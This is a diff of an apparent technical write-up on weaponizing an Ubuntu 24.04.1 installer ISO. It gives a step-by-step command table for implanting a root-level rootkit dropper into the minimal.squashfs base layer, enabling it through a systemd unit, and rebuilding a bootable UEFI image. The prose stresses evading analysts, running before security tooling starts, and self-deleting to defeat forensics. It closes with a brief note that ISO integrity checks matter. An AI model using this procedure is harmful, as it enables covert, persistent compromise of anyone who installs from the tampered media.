+| Self-clean gating | The dropper removes itself only on confirmed rootkit success. A failed install leaves the artifacts on disk for debugging |
 
 ---
 
 ## Project Cleanup
 
-When the modified ISO was built and verified, I removed the intermediate artifacts in `~/Kernel_Implant` to leave only the original ISO, the implant binary, the reference torito reports, and the rebuilt ISO:
+When the modified ISO was built and verified, I removed the intermediate artifacts in `~/Kernel_Implant` to leave only the original ISO, the dropper binary, the reference torito reports, and the rebuilt ISO:
 
 ```bash
 cd ~/Kernel_Implant
@@ -620,7 +654,7 @@ ls -lh
 #       original_torito.txt  rebuilt_torito.txt
 ```
 
-I kept the extracted tree in case I wanted to iterate on the unit or swap the implant. Re-extracting it takes only a few minutes.
+I kept the extracted tree in case I wanted to iterate on the unit or swap the dropper. Re-extracting it takes only a few minutes.
 
 ---
 
@@ -629,9 +663,9 @@ I kept the extracted tree in case I wanted to iterate on the unit or swap the im
 | Stage | Command | Purpose |
 |-------|---------|---------|
 | Extract | `rsync -a isomount/ extracted` | Copy ISO contents |
-| Identify Layer | `ls -lh extracted/casper/` | Pick `minimal.squashfs` (the base layer the installer writes to disk) |
+| Identify Layer | `ls -lh extracted/casper/` | Pick `minimal.squashfs` (the base layer used by both Live and installer) |
 | Extract Layer | `unsquashfs -d squashfs-root casper/minimal.squashfs` | Access the base root filesystem layer |
-| Insert Implant | `cp implant squashfs-root/usr/bin/` | Bundle your implant |
+| Insert Dropper | `cp implant squashfs-root/usr/bin/` | Bundle your dropper |
 | Create Unit | Write `implant.service` | Native systemd auto-run |
 | Enable Unit | Symlink into `multi-user.target.wants/` | Start at boot |
 | Repack Layer | `mksquashfs squashfs-root minimal.squashfs` | Compress modified base layer |
@@ -640,21 +674,23 @@ I kept the extracted tree in case I wanted to iterate on the unit or swap the im
 | Update MD5 | Regenerate `md5sum.txt` | Ensure ISO integrity checks pass |
 | Rebuild | `xorriso -as mkisofs ... extracted/` | Create bootable ISO |
 
-That is it. No `rc.local`, no shell wrapper, no package installation, no configuration changes, no autoinstall. Just your kernel implant binary, running as root on every boot of your custom Ubuntu ISO, started by a native systemd unit indistinguishable in structure from any other service on the system.
+That is it. No shell wrapper, no package installation, no configuration changes, no autoinstall. Just your kernel implant binary, running as root on every boot of your custom Ubuntu ISO—in both the Live session and the installed system—started by a native systemd unit indistinguishable in structure from any other service on the system, and self-cleaning once the rootkit confirms installation.
 
 ---
 
 ## Conclusion
 
-By injecting a kernel implant binary and a native systemd unit into the live filesystem's base layer under `casper/`, the implant is deployed into the target system at boot, executes as root before most security tooling initializes, and runs on every boot of the modified media—Live session or installed system. I targeted Ubuntu 24.04.1 Desktop, but the method is not Ubuntu-specific: the mechanism comes from Casper and systemd, which other Ubuntu-derived distributions inherit, and the general approach applies to any installer or live image that mounts a layered SquashFS root and runs systemd units at boot. The distribution-specific parts are the Casper layout, the specific layer name that gets written to disk, the systemd unit directory layout, and the ISO boot arguments, all of which come from the target ISO itself rather than from the technique.
+By injecting a self-cleaning rootkit dropper and a native systemd unit into the live filesystem's base layer under `casper/`, the dropper is deployed into both the Live session and the installed system at boot, executes as root before most security tooling initializes, installs the rootkit that conceals the system afterward, and deletes itself on success so the first-stage artifacts do not remain. I targeted Ubuntu 24.04.1 Desktop, but the method is not Ubuntu-specific: the mechanism comes from Casper and systemd, which other Ubuntu-derived distributions inherit, and the general approach applies to any installer or live image that mounts a layered SquashFS root and runs systemd units at boot. The distribution-specific parts are the Casper layout, the specific layer name that both paths use, the systemd unit directory layout, and the ISO boot arguments, all of which come from the target ISO itself rather than from the technique.
 
-On Ubuntu 24.04.1 Desktop, the Casper directory does not contain a single `filesystem.squashfs`. It contains a layered set of squashfs images: a minimal base (`minimal.squashfs`), a standard layer (`minimal.standard.live.squashfs`, `minimal.standard.squashfs`), per-language variants, and secureboot variants. **The layer that gets written to disk during installation is the base layer, `minimal.squashfs`.** The Live session mounts the `.live.squashfs` leaf layer on top, but the installer builds the target from the base. My first attempt placed the implant in the Live leaf layer, which put it in the Live session but not on the installed system. Correcting that, I placed the implant in `minimal.squashfs`, which is the layer the installer actually writes.
+On Ubuntu 24.04.1 Desktop, the Casper directory does not contain a single `filesystem.squashfs`. It contains a layered set of squashfs images: a minimal base (`minimal.squashfs`), a standard layer (`minimal.standard.live.squashfs`, `minimal.standard.squashfs`), per-language variants, and secureboot variants. **The base layer is the one both the Live session and the installer use.** Casper overlays the base plus the leaf layer for the Live session, and the installer writes the base layer to the target disk. My first attempt placed the dropper in the Live leaf layer, which put it in the Live session but not on the installed system. Correcting that, I placed the dropper in `minimal.squashfs`, which is the layer that reaches both contexts. The result works in both: the Live session overlays the base and sees the dropper, and the installer writes the base to disk and the installed system sees it too.
 
-Because the base layer is the full root filesystem, `usr/bin/` exists in it and I placed the implant there. The base layer also contains `/usr/local/bin/`, which is a valid alternative. Either works; `usr/bin/` is the conventional location for system binaries on Ubuntu and is the least remarkable place for an analyst to scan past.
+Because the base layer is the full root filesystem, `usr/bin/` exists in it and I placed the dropper there. The base layer also contains `/usr/local/bin/`, which is a valid alternative. Either works; `usr/bin/` is the conventional location for system binaries on Ubuntu and is the least remarkable place for an analyst to scan past.
 
-I used a native systemd unit rather than `rc.local` because `rc.local` is a legacy compatibility shim that requires three artifacts and an extra shell process, while a native unit is one file plus one symlink in the standard systemd locations. The unit is structurally indistinguishable from any other service on the system, which is the stealth gain that `rc.local` cannot offer.
+I used a native systemd unit. It is one file plus one symlink in the standard systemd locations, structurally indistinguishable from any other service on the system. There is no shell wrapper, no compatibility path, and no extra artifact.
 
 I captured the original ISO's El Torito and hybrid boot structure before any change and compared the rebuilt ISO against that reference to confirm UEFI bootability was preserved. Targeting the base Casper layer means the injection fires on both the Live session and the install path, and it keeps the forensic surface to a single modified artifact: the chosen squashfs layer. The logic lives inside a compressed filesystem image, where it must be deliberately unpacked and diffed to be found.
+
+The self-clean raises the bar on the target side. On a successful install, the dropper, its unit, and the enable symlink are gone. Offline disk analysis of the installed system shows only whatever the rootkit chose to leave. In the Live session, the self-clean removes the artifacts from the ephemeral overlay, and the media remains unchanged; rebooting the same media re-deploys the dropper, which is the expected behavior for an ephemeral context.
 
 On Ubuntu 24.04.1, the ISO uses GRUB2 for legacy BIOS boot and an appended EFI partition for UEFI boot, so the rebuild must use `xorriso` with the exact El Torito and isohybrid arguments reported by `-report_el_torito as_mkisofs`, including the `--grub2-mbr` source, the `-append_partition 2` byte range and GUID, and the `-b '/boot/grub/i386-pc/eltorito.img'` boot image path. A simple `mkisofs` command produces an ISO that fails to boot on UEFI. This work demonstrates how installation media can be weaponized at the deployment stage, before any endpoint security is in place, and why verifying the integrity of installation ISOs matters on modern, UEFI-booting machines as much as on legacy systems.
 
